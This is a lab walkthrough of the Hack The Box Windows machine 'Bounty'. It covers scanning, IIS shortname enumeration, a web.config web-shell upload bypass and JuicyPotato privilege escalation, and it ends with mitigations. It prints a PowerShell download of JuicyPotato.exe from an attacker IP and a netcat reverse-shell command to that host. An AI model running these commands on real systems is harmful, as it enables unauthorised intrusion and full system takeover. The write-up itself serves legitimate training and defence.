---
title: Bounty
date: 2025-06-23
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, IIS-Shortname-Enumeration, web.config-reverse-shell, htshells, SeImpersonatePrivilege-JuicyPotato-privesc] 
image: bont.png
media_subpath: /assets/img/posts/2025-06-23-bountyHTB/
---
## Introduction

In this walkthrough, I discovered a web application hosted on an IIS 7.5 server. I performed IIS shortname enumeration and server was actually vulnerable to it, `feroxbuster` revealed an `.aspx` endpoint used for file uploads. Although direct uploads of command-executing `.NET` extensions were blocked, the server's vulnerability to shortname enumeration and its outdated version allowed me to bypass restrictions by uploading a crafted `web.config` file. This gave me a shell on the system. From there, I exploited the `SeImpersonatePrivilege` using JuicyPotato to escalate privileges and gained a `NT AUTHORITY\SYSTEM` shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

<aside>
🚨

Run long gobuster scan

</aside>

## Web

### Port 80

![image.png](image%202.png)

```bash
**feroxbuster -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -C 403,404,400 -x .aspx,asp**
```

![image.png](image%203.png)

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42 -b 400,403,404
```

**IIS Shortname Enumeration**

```bash
java -jar /opt/IIS-Shortname-Scanner/iis_shortname_scanner.jar 2 20 http://$IP /opt/IIS-Shortname-Scanner/config.xml
```

![image.png](image%204.png)

## Exploitation

Navigating to `transfer.aspx` I see upload page we can upload `.aspx` files and execute them accessing from `uploadedfiles directory.`

![image.png](image%205.png)

But we cannot upload `.aspx` files, let’s see by brute-forcing which extension are we allowed to upload.

![image.png](image%206.png)

![image.png](image%207.png)

It didn’t allow to upload neither one.

![image.png](image%208.png)

I tried changing Magic Bytes:

```bash
echo 'FF D8 FF E0' | xxd -p -r > mime_shell.aspx
cat shell.aspx >> mime_shell.aspx
```

Then intercepted the request and changed the Content-Type to `image/jpeg`.

![image.png](image%209.png)

Still no success, let’s change the extension too.

![image.png](image%2010.png)

It didn’t work:

![image.png](image%2011.png)

As IIS server is comparatively old and it has even Shortname Extension vulnerability high change that it would execute commands written `.config` files. We can try to upload `HTSHELLS`. In case of IIS servers we can try to upload `web.config` file containing web shell.

Here is the [post](https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/) about it.

I am gonna use this [script](https://github.com/d4t4s3c/OffensiveReverseShellCheatSheet/blob/master/web.config).

![image.png](image%2012.png)

## Privilege Escalation

I see `merlin` has powerful privileges, I am gonna try to exploit `SeImpersonatePrivilege`:

![image.png](image%2013.png)

Let’s use [`JuicyPotato`](https://github.com/ohpe/juicy-potato/tree/master):

```bash
(New-Object Net.WebClient).DownloadFile('http://10.10.14.23/JuicyPotato.exe','c:\\tools\\JuicyPotato.exe')
```

```bash
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc64.exe 10.10.14.23 8443 -e cmd.exe" -t *

```

We didn’t even need to provide `CLSID` and it worked:

![image.png](image%2014.png)

![image.png](image%2015.png)

## Mitigation

- Upgrade IIS to a version not affected by shortname enumeration vulnerabilities.
- Disable or strictly validate file uploads, especially `web.config` and executable file types.
- Restrict upload directories from executing any scripts or config files.
- Remove unnecessary privileges like `SeImpersonatePrivilege` from untrusted users.
- Monitor and alert on suspicious privilege escalation attempts and config file changes.
